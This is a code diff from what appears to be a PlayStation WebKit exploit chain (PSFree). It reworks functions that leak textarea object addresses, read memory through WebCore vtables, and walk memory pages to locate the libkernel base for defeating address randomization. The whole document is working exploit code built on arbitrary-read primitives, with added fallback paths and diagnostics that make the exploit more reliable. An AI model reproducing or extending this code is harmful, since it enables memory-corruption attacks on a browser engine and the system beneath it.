@@ -1714,60 +1714,139 @@ export function verifyLibkernelBase(p, lk, off) {
     return { ok: true, lk, weak: true, warn: "prologue OK — getpid stub not at known offsets" };
 }
 
-/** Resolve ext code ptr → libkernel base (k__error, walk-back, stub verify). */
-function resolveExtPtrToLibkernel(p, fnPtr, off, webkitBase, iatRva) {
+/** Resolve ext ptr without reading the code page (OOM-safe on poops cal ptrs). */
+function findModuleBaseBeforeCode(p, fnPtr, webkitBase, off, maxPages) {
     if (!fnPtr || fnPtr.hi < 0x8) return null;
-
-    const psf = lkFromFnPtrPsfree(p, fnPtr, off, iatRva, webkitBase);
-    if (psf) {
-        const v = verifyLibkernelBase(p, psf.lk, off);
-        if (v.ok) {
-            return Object.assign(psf, {
-                strong: !!v.strong,
-                via: psf.via + (v.strong ? "+stub" : "+prologue"),
-            });
+    maxPages = maxPages || 512;
+    let page = pageAlignDown(fnPtr, 0x4000);
+    if (page.hi >= 0x8) page = page.sub32(0x4000);
+    for (let i = 0; i < maxPages; i++) {
+        if (!page || page.hi < 0x8) break;
+        const magic = read4p(p, page);
+        if (magic != null && isModuleMagic(magic)) {
+            if (!isSameWebkitModule(page, webkitBase, off))
+                return page;
         }
-        if (looksLikeLibkernelModule(p, psf.lk)) {
-            return Object.assign(psf, { strong: false, via: psf.via + "+score" });
-        }
+        if (magic == null) break;
+        page = page.sub32(0x4000);
     }
-
-    const walked = findModuleBaseBackward(p, fnPtr, 256);
-    if (walked && looksLikeLibkernelModule(p, walked)) {
-        const v = verifyLibkernelBase(p, walked, off);
-        return {
-            lk: walked,
-            iatRva,
-            fnPtr,
-            strong: !!(v.ok && v.strong),
-            via: "walk256" + (v.ok && v.strong ? "+stub" : "+score"),
-        };
-    }
-
     return null;
 }
 
-/** PSFree textarea → WebCore → vtable (RELRO). Prefer exploit carrier textarea. */
-function leakTextareaVtable(p, opts) {
+function addrFromNum(n) {
+    if (!Number.isFinite(n) || n <= 0) return null;
+    const b = BigInt(Math.trunc(n));
+    return new int64(Number(b & 0xffffffffn), Number((b >> 32n) & 0xffffffffn));
+}
+
+function plausibleCodePtr(p) {
+    return p && p.hi >= 0x8 && p.hi <= 0x12;
+}
+
+function looksLikeNativeCodeMagic(w) {
+    if (w == null) return false;
+    const b0 = w & 0xff;
+    return b0 === 0x55 || b0 === 0x48 || b0 === 0xb8 || b0 === 0xe9 || b0 === 0x41;
+}
+
+/** cal_demo-style multi-path textarea → vtable discovery. */
+function discoverTextareaVtables(p, opts) {
     opts = opts || {};
-    let cell = null;
+    const cells = [];
+    const seenCell = new Set();
+    function addCell(label, cell) {
+        if (!cell || cell.hi < 0x8) return;
+        const k = ptrBig(cell).toString(16);
+        if (seenCell.has(k)) return;
+        seenCell.add(k);
+        cells.push({ label: label, cell: cell });
+    }
     try {
         if (opts.carrier && opts.carrier.textarea)
-            cell = p.leakval(opts.carrier.textarea);
-        else {
-            const ta = document.createElement("textarea");
-            if (opts.retain) opts.retain.push(ta);
-            cell = p.leakval(ta);
-        }
-    } catch (_) {
-        return null;
+            addCell("carrier.ta", p.leakval(opts.carrier.textarea));
+    } catch (_) { }
+    if (opts.carrier && opts.carrier.textareaAddress > 0)
+        addCell("carrier.addr", addrFromNum(opts.carrier.textareaAddress));
+    try {
+        const ta = document.createElement("textarea");
+        if (opts.retain) opts.retain.push(ta);
+        addCell("fresh.ta", p.leakval(ta));
+    } catch (_) { }
+
+    const vtables = [];
+    const seenVt = new Set();
+    function addVt(label, vtable, webcore) {
+        if (!vtable || !plausibleCodePtr(vtable)) return;
+        const e0 = read4p(p, vtable);
+        if (!looksLikeNativeCodeMagic(e0) && e0 == null) return;
+        const k = ptrBig(vtable).toString(16);
+        if (seenVt.has(k)) return;
+        seenVt.add(k);
+        vtables.push({ label: label, vtable: vtable, webcore: webcore, entry0: e0 });
     }
-    if (!cell) return null;
-    const webcore = read8p(p, cell.add32(0x18));
-    if (!webcore) return null;
-    const vtable = read8p(p, webcore);
-    if (!vtable) return null;
-    return { cell, webcore, vtable };
+
+    for (let ci = 0; ci < cells.length; ci++) {
+        const path = cells[ci];
+        const webcore18 = read8p(p, path.cell.add32(0x18));
+        if (webcore18) {
+            const vt = read8p(p, webcore18);
+            if (vt) addVt(path.label + "/psfree+0x18", vt, webcore18);
+        }
+        const bfly = read8p(p, path.cell.add32(0x8));
+        if (bfly && bfly.hi >= 0x8) {
+            for (let slot = 0; slot < 16; slot++) {
+                const wc = read8p(p, bfly.add32(slot * 8));
+                if (!wc) continue;
+                const vt = read8p(p, wc);
+                if (vt) addVt(path.label + "/bfly" + slot, vt, wc);
+            }
+        }
+        for (let implOff = 0x8; implOff <= 0x30; implOff += 8) {
+            if (implOff === 0x18) continue;
+            const wc = read8p(p, path.cell.add32(implOff));
+            if (!wc) continue;
+            const vt = read8p(p, wc);
+            if (vt) addVt(path.label + "/impl+" + implOff.toString(16), vt, wc);
+        }
+    }
+    return { cells: cells.length, vtables: vtables };
+}
+
+/** Resolve ext code ptr → libkernel base — never reads fnPtr (code page OOM on poops). */
+function resolveExtPtrToLibkernel(p, fnPtr, off, webkitBase, iatRva) {
+    if (!fnPtr || fnPtr.hi < 0x8) return null;
+
+    const errs = kErrorCandidates(off);
+    for (let i = 0; i < errs.length; i++) {
+        const lk = fnPtr.sub32(errs[i]);
+        if (!lkAligned(lk)) continue;
+        if (isLibkernelPrologue(p, lk)) {
+            const v = verifyLibkernelBase(p, lk, off);
+            return {
+                lk,
+                iatRva,
+                fnPtr,
+                strong: !!(v.ok && v.strong),
+                via: "safe-error+" + errs[i].toString(16),
+            };
+        }
+    }
+
+    const walked = findModuleBaseBeforeCode(p, fnPtr, webkitBase, off, 512);
+    if (walked) {
+        if (looksLikeLibkernelModule(p, walked) || isLibkernelPrologue(p, walked)) {
+            const v = verifyLibkernelBase(p, walked, off);
+            return {
+                lk: walked,
+                iatRva,
+                fnPtr,
+                strong: !!(v.ok && v.strong),
+                via: "safe-walk" + (v.ok && v.strong ? "+stub" : ""),
+            };
+        }
+    }
+
+    return null;
 }
 
 /** Poops mapped RELRO/GOT islands — avoids OOM cliff @ +0x30c10 and high GOT. */
@@ -2058,33 +2137,64 @@ function scanTextareaRelroChunk(p, webkitBase, off, state, opts) {
     const maxVt = opts.vtableEntries || 48;
 
     if (!state) {
-        state = { stage: "setup", vtMax: maxVt, vtIdx: 0, tried: 0, extList: [] };
+        state = {
+            stage: "setup",
+            vtMax: maxVt,
+            vtIdx: 0,
+            vtListIdx: 0,
+            vtables: [],
+            tried: 0,
+            extList: [],
+        };
         return { done: false, state, phase: "vt-start", max: maxVt };
     }
 
     if (state.stage === "setup") {
-        const leak = leakTextareaVtable(p, opts);
-        state.vtable = leak ? leak.vtable : null;
-        state.webcore = leak ? leak.webcore : null;
-        state.stage = state.vtable ? "vtable" : "done";
-        if (!state.vtable) {
-            return { done: true, ok: false, state, phase: "vt-miss", error: "no vtable" };
+        const disc = discoverTextareaVtables(p, opts);
+        state.vtables = disc.vtables;
+        state.cells = disc.cells;
+        state.vtListIdx = 0;
+        state.vtIdx = 0;
+        state.stage = state.vtables.length ? "vtable" : "done";
+        if (!state.vtables.length) {
+            return {
+                done: true,
+                ok: false,
+                state,
+                phase: "vt-miss",
+                error: "no vtable (cells=" + disc.cells + ")",
+                cells: disc.cells,
+            };
         }
+        state.vtable = state.vtables[0].vtable;
+        state.vtLabel = state.vtables[0].label;
         return {
             done: false,
             state,
             phase: "vt-ready",
             vtable: String(state.vtable),
+            vtCount: state.vtables.length,
+            cells: disc.cells,
+            label: state.vtLabel,
         };
     }
 
     if (state.stage === "vtable") {
         let batch = 0;
-        while (state.vtIdx < state.vtMax && batch < 6) {
+        while (batch < 6) {
+            if (state.vtListIdx >= state.vtables.length) break;
+            const cur = state.vtables[state.vtListIdx];
+            state.vtable = cur.vtable;
+            state.vtLabel = cur.label;
+            if (state.vtIdx >= state.vtMax) {
+                state.vtListIdx++;
+                state.vtIdx = 0;
+                continue;
+            }
             const idx = state.vtIdx++;
             state.tried++;
             batch++;
-            const fnPtr = read8p(p, state.vtable.add32(idx * 8));
+            const fnPtr = read8p(p, cur.vtable.add32(idx * 8));
             if (!fnPtr) continue;
             if (!plausibleExtPtr(fnPtr, webkitBase, off)) continue;
             const hit = resolveExtPtrToLibkernel(p, fnPtr, off, webkitBase, null);
@@ -2095,17 +2205,17 @@ function scanTextareaRelroChunk(p, webkitBase, off, state, opts) {
                     ok: true,
                     lk: hit.lk,
                     iatRva: hit.iatRva,
-                    source: "vt[" + idx + "]/" + hit.via,
+                    source: cur.label + "/[" + idx + "]/" + hit.via,
                     state,
                     phase: "vt-hit",
                     tried: state.tried,
-                    vtableAbs: state.vtable,
+                    vtableAbs: cur.vtable,
                 };
             }
             if (state.extList.length < 16)
-                state.extList.push({ ptr: String(fnPtr), idx: idx });
+                state.extList.push({ ptr: String(fnPtr), idx: idx, vt: cur.label });
         }
-        if (state.vtIdx >= state.vtMax) {
+        if (state.vtListIdx >= state.vtables.length) {
             return {
                 done: true,
                 ok: false,
@@ -2114,6 +2224,8 @@ function scanTextareaRelroChunk(p, webkitBase, off, state, opts) {
                 tried: state.tried,
                 extList: state.extList,
                 vtableAbs: state.vtable,
+                vtCount: state.vtables.length,
+                cells: state.cells,
             };
         }
         return {
@@ -2122,10 +2234,12 @@ function scanTextareaRelroChunk(p, webkitBase, off, state, opts) {
             phase: "vt",
             tried: state.tried,
             idx: state.vtIdx,
+            vtList: state.vtListIdx + "/" + state.vtables.length,
+            label: state.vtLabel,
         };
     }
 
-    return { done: true, ok: false, state, phase: "vt-miss" };
+    return { done: true, ok: false, state, phase: "vt-miss", cells: state.cells || 0 };
 }
 
 /**
@@ -2142,9 +2256,12 @@ export function resolveLibkernelRelroChunk(p, webkitBase, off, state, opts) {
             vtableAbs: null,
             anchors: null,
             loadBaseHdr: null,
+            diag: { cells: 0, vtables: 0, vtExt: 0, abs: 0, nearPages: 0, belowPages: 0 },
         };
         return { done: false, state, phase: "got-scan-start" };
     }
+
+    if (!state.diag) state.diag = {};
 
     if (!state.anchors) {
         state.anchors = [webkitBase];
@@ -2168,6 +2285,9 @@ export function resolveLibkernelRelroChunk(p, webkitBase, off, state, opts) {
             state.stage = "abs";
             state.sub = null;
             opts.vtableAbs = state.vtableAbs;
+            state.diag.cells = c.cells || state.diag.cells;
+            state.diag.vtables = c.vtCount || state.diag.vtables;
+            state.diag.vtExt = (c.extList && c.extList.length) || state.extList.length;
             return {
                 done: false,
                 state,
@@ -2175,6 +2295,9 @@ export function resolveLibkernelRelroChunk(p, webkitBase, off, state, opts) {
                 prev: c.phase,
                 vtable: state.vtableAbs ? String(state.vtableAbs) : "?",
                 ext: state.extList.length,
+                cells: c.cells,
+                vtCount: c.vtCount,
+                error: c.error,
             };
         }
         return Object.assign({ state }, c);
@@ -2190,6 +2313,7 @@ export function resolveLibkernelRelroChunk(p, webkitBase, off, state, opts) {
         if (c.done) {
             state.stage = "nearlk";
             state.sub = null;
+            state.diag.abs = c.tried || 0;
             return {
                 done: false,
                 state,
@@ -2211,6 +2335,8 @@ export function resolveLibkernelRelroChunk(p, webkitBase, off, state, opts) {
         if (c.done) {
             state.stage = "below";
             state.sub = null;
+            state.diag.nearPages = c.pages || 0;
+            state.diag.nearHits = c.hits || 0;
             return {
                 done: false,
                 state,
@@ -2232,6 +2358,7 @@ export function resolveLibkernelRelroChunk(p, webkitBase, off, state, opts) {
         if (c.done) {
             state.stage = "hdr";
             state.sub = null;
+            state.diag.belowPages = c.pages || 0;
             return {
                 done: false,
                 state,
@@ -2303,6 +2430,12 @@ export function resolveLibkernelRelroChunk(p, webkitBase, off, state, opts) {
                 vtable: state.vtableAbs ? String(state.vtableAbs) : null,
                 tried: c.tried,
                 prev: c.phase,
+                diag: state.diag,
+                cells: state.diag.cells,
+                vtCount: state.diag.vtables,
+                vtExt: state.diag.vtExt,
+                nearPages: state.diag.nearPages,
+                belowPages: state.diag.belowPages,
             };
         }
         return Object.assign({ state }, c);
